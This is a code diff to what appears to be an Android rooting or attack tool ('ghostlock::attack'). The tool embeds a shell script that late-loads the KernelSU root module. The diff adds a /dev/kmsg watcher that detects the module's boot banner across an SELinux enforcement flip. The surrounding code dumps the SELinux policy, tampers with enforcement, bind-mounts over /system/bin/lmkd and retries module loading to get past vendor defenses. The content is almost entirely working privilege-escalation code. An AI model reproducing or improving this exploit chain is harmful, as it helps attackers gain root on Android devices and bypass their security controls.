@@ -409,12 +409,66 @@ namespace ghostlock::attack {
             "  return 0\n"
             "}\n"
             /* kernelsu_init ends with setenforce(true), and from that moment this
-             * shell cannot read /proc/modules. Measured 2026-11-15: the module
-             * is visible for ~0.2 s before the flip, which a grep pipeline
-             * cannot reliably sample. The drained kernel log in
-             * /data/local/tmp survives the flip, so readiness is "module seen"
-             * OR "KernelSU printed its banner" OR "ksud installed". */
-            "ksu_booted() { grep -q 'KernelSU: welcome' \"$KMSG_MIRROR\" 2>/dev/null; }\n"
+             * shell cannot read /proc/modules or dmesg. Measured 2026-11-15: the
+             * module is visible for ~0.2 s before the flip, which a grep
+             * pipeline cannot reliably sample. Keep a blocking /dev/kmsg watch
+             * open from before late-load so `KernelSU: welcome` (logged at the
+             * top of kernelsu_init, before setenforce) is caught in-flight and
+             * survives the flip even if the mirror write is denied. */
+            "KSU_WELCOME=0\n"
+            "KMSG_WATCH_PID=\"\"\n"
+            "ksu_watch_start() {\n"
+            "  [ -n \"$KMSG_WATCH_PID\" ] && return 0\n"
+            "  [ -r /dev/kmsg ] || return 0\n"
+            "  (\n"
+            "    gp=\"\"\n"
+            "    grc=1\n"
+            "    trap '[ -n \"$gp\" ] && kill \"$gp\" 2>/dev/null; [ \"${grc:-1}\" -eq 0 ] && exit 0; exit 143' TERM INT\n"
+            "    while :; do\n"
+            "      grep -q 'KernelSU: welcome' /dev/kmsg 2>/dev/null &\n"
+            "      gp=$!\n"
+            "      wait \"$gp\" 2>/dev/null\n"
+            "      grc=$?\n"
+            "      gp=\"\"\n"
+            "      [ \"$grc\" -eq 0 ] && exit 0\n"
+            "      [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" = 0 ] || exit 1\n"
+            "      sleep 0.05\n"
+            "    done\n"
+            "  ) &\n"
+            "  KMSG_WATCH_PID=$!\n"
+            "}\n"
+            "ksu_watch_reap() {\n"
+            "  [ \"$KSU_WELCOME\" -eq 1 ] && return 0\n"
+            "  [ -z \"$KMSG_WATCH_PID\" ] && return 1\n"
+            "  if grep -q '^State:[[:space:]]*Z' \"/proc/$KMSG_WATCH_PID/status\" 2>/dev/null || ! kill -0 \"$KMSG_WATCH_PID\" 2>/dev/null; then\n"
+            "    wait \"$KMSG_WATCH_PID\" 2>/dev/null\n"
+            "    w_rc=$?\n"
+            "    KMSG_WATCH_PID=\"\"\n"
+            "    if [ \"$w_rc\" -eq 0 ]; then\n"
+            "      KSU_WELCOME=1\n"
+            "      echo 'KSU-WATCH welcome=1'\n"
+            "      return 0\n"
+            "    fi\n"
+            "  fi\n"
+            "  return 1\n"
+            "}\n"
+            "ksu_watch_finish() {\n"
+            "  ksu_watch_reap && return 0\n"
+            "  [ -z \"$KMSG_WATCH_PID\" ] && return 0\n"
+            "  kill \"$KMSG_WATCH_PID\" 2>/dev/null\n"
+            "  wait \"$KMSG_WATCH_PID\" 2>/dev/null\n"
+            "  w_rc=$?\n"
+            "  KMSG_WATCH_PID=\"\"\n"
+            "  if [ \"$w_rc\" -eq 0 ]; then\n"
+            "    KSU_WELCOME=1\n"
+            "    echo 'KSU-WATCH welcome=1'\n"
+            "  fi\n"
+            "}\n"
+            "ksu_booted() {\n"
+            "  ksu_watch_reap && return 0\n"
+            "  [ \"$KSU_WELCOME\" -eq 1 ] && return 0\n"
+            "  grep -q 'KernelSU: welcome' \"$KMSG_MIRROR\" 2>/dev/null\n"
+            "}\n"
             "ksu_crown() {\n"
             "  crown=$(grep -E 'Crowning manager: uid=|manager uid unchanged|Found manager base.apk|Search manager finished' \"$KMSG_MIRROR\" 2>/dev/null | tail -n 3)\n"
             "  case \"$crown\" in\n"
@@ -458,7 +512,7 @@ namespace ghostlock::attack {
             "  n=0; miss=0\n"
             "  while [ \"$n\" -lt 12 ]; do\n"
             "    n=$((n + 1))\n"
-            "    if timeout 1 dmesg 2>/dev/null | tail -n 1200 >\"$KMSG_MIRROR.new\" 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
+            "    if ( timeout 1 dmesg | tail -n 1200 >\"$KMSG_MIRROR.new\" ) 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
             "      mv \"$KMSG_MIRROR.new\" \"$KMSG_MIRROR\" 2>/dev/null\n"
             "      if [ \"$KMSG_LOG\" != \"$KMSG_MIRROR\" ]; then cp \"$KMSG_MIRROR\" \"$KMSG_LOG\" 2>/dev/null; fi\n"
             "      miss=0\n"
@@ -679,7 +733,7 @@ namespace ghostlock::attack {
              * is load-bearing: once enforcing, dmesg fails but the pipeline
              * still exits 0 through tail, and an empty file would clobber the
              * last good snapshot (measured 2026-11-15). */
-            "      if timeout 2 dmesg 2>/dev/null | tail -n 1200 >\"$KMSG_MIRROR.new\" 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
+            "      if ( timeout 2 dmesg | tail -n 1200 >\"$KMSG_MIRROR.new\" ) 2>/dev/null && [ -s \"$KMSG_MIRROR.new\" ]; then\n"
             "        mv \"$KMSG_MIRROR.new\" \"$KMSG_MIRROR\" 2>/dev/null\n"
             "        if [ \"$KMSG_LOG\" != \"$KMSG_MIRROR\" ]; then cp \"$KMSG_MIRROR\" \"$KMSG_LOG\" 2>/dev/null; fi\n"
             "      fi\n"
@@ -795,7 +849,7 @@ namespace ghostlock::attack {
             "  restore_enforce policy-dump\n"
             "  exit 1\n"
             "}\n"
-            "trap '[ -n \"$KMSG_DRAIN_PID\" ] && kill $KMSG_DRAIN_PID 2>/dev/null; [ -n \"$KMSG_LOG\" ] && rm -f \"$KMSG_LOG.new\" 2>/dev/null; umount -l /system/bin/lmkd 2>/dev/null; rm -f \"$POLICY\"; [ \"${DUMP_DONE:-0}\" = 1 ] || dump_debug' EXIT\n"
+            "trap '[ -n \"$KMSG_DRAIN_PID\" ] && kill $KMSG_DRAIN_PID 2>/dev/null; [ -n \"$KMSG_WATCH_PID\" ] && kill $KMSG_WATCH_PID 2>/dev/null; [ -n \"$KMSG_LOG\" ] && rm -f \"$KMSG_LOG.new\" 2>/dev/null; umount -l /system/bin/lmkd 2>/dev/null; rm -f \"$POLICY\"; [ \"${DUMP_DONE:-0}\" = 1 ] || dump_debug' EXIT\n"
             "prepare_policy() {\n"
             "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
             "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
@@ -907,6 +961,7 @@ namespace ghostlock::attack {
              * 0.4 s and its daemonized ksud died before init_module, leaving
              * /proc/modules empty for the whole wait. Settle first, then retry
              * while the module stays absent. */
+            "  ksu_watch_start\n"
             "  LATE_LOAD_SETTLE=4\n"
             "  echo \"[*] post-fixup settle ${LATE_LOAD_SETTLE}s; mode=$LATE_LOAD_MODE gate=$OEM_GATE\" >>\"$LOG\"\n"
             "  sleep \"$LATE_LOAD_SETTLE\"\n"
@@ -931,6 +986,10 @@ namespace ghostlock::attack {
             "    echo \"KSU-ATTEMPT n=$KSU_ATTEMPT mode=$LATE_LOAD_MODE seen=$KSU_SEEN boot=$KSU_BOOT\"\n"
             "    echo \"[*] attempt $KSU_ATTEMPT mode=$LATE_LOAD_MODE seen=$KSU_SEEN boot=$KSU_BOOT\" >>\"$LOG\"\n"
             "    ksu_ready_now && break\n"
+            "    if [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" != 0 ]; then\n"
+            "      ksu_watch_finish\n"
+            "      ksu_ready_now && break\n"
+            "    fi\n"
             /* A gated device keeps the mount path: the direct exec is the one
              * the vendor kills. Elsewhere alternate to cover both carriers. */
             "    if [ \"$OEM_GATE\" -eq 0 ]; then\n"
@@ -941,6 +1000,8 @@ namespace ghostlock::attack {
             "fi\n"
             "if [ \"$KSU_ALREADY\" -eq 0 ]; then\n"
             "  wait_ksu_ready\n"
+            "  ksu_watch_finish\n"
+            "  ksu_booted && KSU_BOOT=1\n"
             "else\n"
             "  KSU_SEEN=Live\n"
             "  KSU_BOOT=1\n"
